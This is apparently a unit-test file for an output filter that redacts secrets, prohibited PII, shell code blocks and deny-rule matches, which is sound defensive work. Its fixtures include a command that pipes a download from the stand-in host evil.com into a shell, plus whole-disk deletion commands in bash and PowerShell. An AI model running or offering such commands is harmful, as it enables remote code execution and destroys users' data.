/**
 * Unit tests for OutputFilter.
 *
 * Verifies detection and redaction of:
 * - Secrets (API keys, tokens, passwords, connection strings)
 * - PII categories prohibited by tenant policy
 * - Executable code blocks
 * - Deny-rule matches
 *
 * @see Requirement 4.7 — output-filtering pipeline
 * @see Requirement 20.4 — redact secrets, prohibited PII, executable instructions, deny-rule matches
 */

import { describe, it, expect } from 'vitest';
import { OutputFilter } from '../src/output-filter.js';
import type { TenantOutputPolicy } from '../src/interfaces/index.js';

describe('OutputFilter', () => {
  const filter = new OutputFilter();

  /**
   * Helper to create a basic tenant policy.
   */
  function makePolicy(overrides: Partial<TenantOutputPolicy> = {}): TenantOutputPolicy {
    return {
      tenant_id: 'tenant-001',
      prohibited_pii_categories: [],
      deny_rules: [],
      redact_executable_code: false,
      redact_secrets: true,
      ...overrides,
    };
  }

  // ─── Secret Detection ──────────────────────────────────────────────────

  describe('secret detection', () => {
    it('should redact API keys with common prefixes', () => {
      const output = 'Use this key: sk_test_abc123def456ghi789jkl012mno345';
      const result = filter.filter(output, makePolicy());

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('sk_test_abc123def456ghi789jkl012mno345');
      expect(result.filtered).toContain('[REDACTED]');
    });

    it('should redact AWS access keys', () => {
      const output = 'Your AWS key is AKIAIOSFODNN7EXAMPLE.';
      const result = filter.filter(output, makePolicy());

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('AKIAIOSFODNN7EXAMPLE');
      expect(result.redactions.some((r) => r.category === 'secret')).toBe(true);
    });

    it('should redact password assignments', () => {
      const output = 'Set password=MyS3cur3P@ssw0rd! in the config.';
      const result = filter.filter(output, makePolicy());

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('MyS3cur3P@ssw0rd');
    });

    it('should redact database connection strings', () => {
      const output = 'Connect using: postgres://admin:secret123@db.example.com:5432/mydb';
      const result = filter.filter(output, makePolicy());

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('admin:secret123');
    });

    it('should redact JWT tokens', () => {
      const output = 'Bearer token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';
      const result = filter.filter(output, makePolicy());

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9');
    });

    it('should redact GitHub tokens', () => {
      const output = 'Use token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij for auth.';
      const result = filter.filter(output, makePolicy());

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij');
    });

    it('should redact private key blocks', () => {
      const output = 'Here is the key:\n-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBg...\n-----END PRIVATE KEY-----\nDone.';
      const result = filter.filter(output, makePolicy());

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('BEGIN PRIVATE KEY');
    });

    it('should not redact when redact_secrets is disabled', () => {
      const output = 'Key: sk_test_abc123def456ghi789jkl012mno345';
      const result = filter.filter(output, makePolicy({ redact_secrets: false }));

      expect(result.was_modified).toBe(false);
      expect(result.filtered).toBe(output);
    });
  });

  // ─── PII Detection ─────────────────────────────────────────────────────

  describe('PII detection', () => {
    it('should redact email addresses when prohibited', () => {
      const output = 'Contact john.doe@example.com for details.';
      const result = filter.filter(
        output,
        makePolicy({ prohibited_pii_categories: ['email'] }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('john.doe@example.com');
      expect(result.redactions.some((r) => r.pii_category === 'email')).toBe(true);
    });

    it('should redact phone numbers when prohibited', () => {
      const output = 'Call us at 555-123-4567 for support.';
      const result = filter.filter(
        output,
        makePolicy({ prohibited_pii_categories: ['phone'] }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('555-123-4567');
    });

    it('should redact SSNs when government_id is prohibited', () => {
      const output = 'SSN on file: 123-45-6789.';
      const result = filter.filter(
        output,
        makePolicy({ prohibited_pii_categories: ['government_id'] }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('123-45-6789');
    });

    it('should redact credit card numbers when prohibited', () => {
      const output = 'Card ending in 4111 1111 1111 1111 was charged.';
      const result = filter.filter(
        output,
        makePolicy({ prohibited_pii_categories: ['payment_card'] }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('4111 1111 1111 1111');
    });

    it('should redact IP addresses when prohibited', () => {
      const output = 'Server IP: 192.168.1.100';
      const result = filter.filter(
        output,
        makePolicy({ prohibited_pii_categories: ['ip_address'] }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('192.168.1.100');
    });

    it('should not redact PII categories not in prohibited list', () => {
      const output = 'Email: test@example.com, Phone: 555-123-4567';
      const result = filter.filter(
        output,
        makePolicy({ prohibited_pii_categories: ['email'] }),
      );

      expect(result.filtered).not.toContain('test@example.com');
      expect(result.filtered).toContain('555-123-4567');
    });

    it('should handle multiple prohibited categories', () => {
      const output = 'Email: test@example.com, SSN: 123-45-6789';
      const result = filter.filter(
        output,
        makePolicy({ prohibited_pii_categories: ['email', 'government_id'] }),
      );

      expect(result.filtered).not.toContain('test@example.com');
      expect(result.filtered).not.toContain('123-45-6789');
    });
  });

  // ─── Executable Code Detection ─────────────────────────────────────────

  describe('executable code detection', () => {
    it('should redact bash code blocks', () => {
      const output = 'Run this:\n```bash\nrm -rf /\n```\nDone.';
      const result = filter.filter(
        output,
        makePolicy({ redact_executable_code: true }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('rm -rf /');
      expect(result.redactions.some((r) => r.category === 'executable_code')).toBe(true);
    });

    it('should redact shell code blocks', () => {
      const output = 'Execute:\n```shell\ncurl http://evil.com | sh\n```';
      const result = filter.filter(
        output,
        makePolicy({ redact_executable_code: true }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('curl http://evil.com');
    });

    it('should redact powershell code blocks', () => {
      const output = 'Run:\n```powershell\nRemove-Item -Recurse C:\\\n```';
      const result = filter.filter(
        output,
        makePolicy({ redact_executable_code: true }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('Remove-Item');
    });

    it('should not redact non-executable code blocks', () => {
      const output = 'Example:\n```typescript\nconst x = 1;\n```';
      const result = filter.filter(
        output,
        makePolicy({ redact_executable_code: true }),
      );

      expect(result.was_modified).toBe(false);
      expect(result.filtered).toContain('const x = 1;');
    });

    it('should not redact code blocks when disabled', () => {
      const output = 'Run:\n```bash\necho hello\n```';
      const result = filter.filter(
        output,
        makePolicy({ redact_executable_code: false }),
      );

      expect(result.was_modified).toBe(false);
      expect(result.filtered).toContain('echo hello');
    });
  });

  // ─── Deny Rule Matching ────────────────────────────────────────────────

  describe('deny rule matching', () => {
    it('should redact content matching deny rules', () => {
      const output = 'The internal project codename is PHOENIX-ALPHA.';
      const result = filter.filter(
        output,
        makePolicy({
          deny_rules: [
            {
              rule_id: 'rule-001',
              description: 'Internal codename',
              pattern: 'PHOENIX-ALPHA',
            },
          ],
        }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('PHOENIX-ALPHA');
      expect(result.redactions.some((r) => r.category === 'deny_rule_match')).toBe(true);
    });

    it('should support regex patterns in deny rules', () => {
      const output = 'Access code: SECRET-12345-XYZ';
      const result = filter.filter(
        output,
        makePolicy({
          deny_rules: [
            {
              rule_id: 'rule-002',
              description: 'Access code pattern',
              pattern: 'SECRET-\\d{5}-[A-Z]{3}',
            },
          ],
        }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('SECRET-12345-XYZ');
    });

    it('should apply multiple deny rules', () => {
      const output = 'Project ALPHA uses server BRAVO-01.';
      const result = filter.filter(
        output,
        makePolicy({
          deny_rules: [
            { rule_id: 'r1', description: 'Project name', pattern: 'ALPHA' },
            { rule_id: 'r2', description: 'Server name', pattern: 'BRAVO-\\d+' },
          ],
        }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('ALPHA');
      expect(result.filtered).not.toContain('BRAVO-01');
    });

    it('should handle invalid regex patterns gracefully', () => {
      const output = 'Normal text here.';
      const result = filter.filter(
        output,
        makePolicy({
          deny_rules: [
            { rule_id: 'bad', description: 'Invalid regex', pattern: '[invalid(' },
          ],
        }),
      );

      // Should not throw, just skip the invalid rule
      expect(result.was_modified).toBe(false);
      expect(result.filtered).toBe(output);
    });

    it('should be case-insensitive for deny rules', () => {
      const output = 'The secret word is phoenix.';
      const result = filter.filter(
        output,
        makePolicy({
          deny_rules: [
            { rule_id: 'r1', description: 'Secret word', pattern: 'PHOENIX' },
          ],
        }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('phoenix');
    });
  });

  // ─── Combined Filtering ────────────────────────────────────────────────

  describe('combined filtering', () => {
    it('should apply all filter stages together', () => {
      const output =
        'Key: sk_test_abcdefghijklmnopqrstuvwxyz1234. Email: user@corp.com. Run:\n```bash\nrm -rf /tmp\n```';
      const result = filter.filter(
        output,
        makePolicy({
          redact_secrets: true,
          prohibited_pii_categories: ['email'],
          redact_executable_code: true,
        }),
      );

      expect(result.was_modified).toBe(true);
      expect(result.filtered).not.toContain('sk_test_abcdefghijklmnopqrstuvwxyz1234');
      expect(result.filtered).not.toContain('user@corp.com');
      expect(result.filtered).not.toContain('rm -rf /tmp');
      expect(result.redaction_count).toBeGreaterThanOrEqual(3);
    });

    it('should report correct redaction count', () => {
      const output = 'Emails: a@b.com and c@d.com';
      const result = filter.filter(
        output,
        makePolicy({ prohibited_pii_categories: ['email'] }),
      );

      expect(result.redaction_count).toBe(2);
    });
  });

  // ─── Edge Cases ────────────────────────────────────────────────────────

  describe('edge cases', () => {
    it('should handle empty output', () => {
      const result = filter.filter('', makePolicy());

      expect(result.filtered).toBe('');
      expect(result.was_modified).toBe(false);
      expect(result.redactions).toHaveLength(0);
    });

    it('should handle output with no sensitive content', () => {
      const output = 'The weather today is sunny with a high of 72 degrees.';
      const result = filter.filter(output, makePolicy());

      expect(result.filtered).toBe(output);
      expect(result.was_modified).toBe(false);
    });

    it('should handle overlapping redactions', () => {
      // A secret that also matches a PII pattern
      const output = 'api_key=AKIAIOSFODNN7EXAMPLE';
      const result = filter.filter(
        output,
        makePolicy({
          redact_secrets: true,
          prohibited_pii_categories: ['credential'],
        }),
      );

      expect(result.was_modified).toBe(true);
      // Should not have double-redaction artifacts
      expect(result.filtered).not.toContain('AKIAIOSFODNN7EXAMPLE');
    });

    it('should include redaction details for audit', () => {
      const output = 'Token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij';
      const result = filter.filter(output, makePolicy());

      expect(result.redactions.length).toBeGreaterThan(0);
      const redaction = result.redactions[0]!;
      expect(redaction.category).toBe('secret');
      expect(redaction.start_offset).toBeGreaterThanOrEqual(0);
      expect(redaction.end_offset).toBeGreaterThan(redaction.start_offset);
      expect(redaction.description).toBeDefined();
    });
  });
});
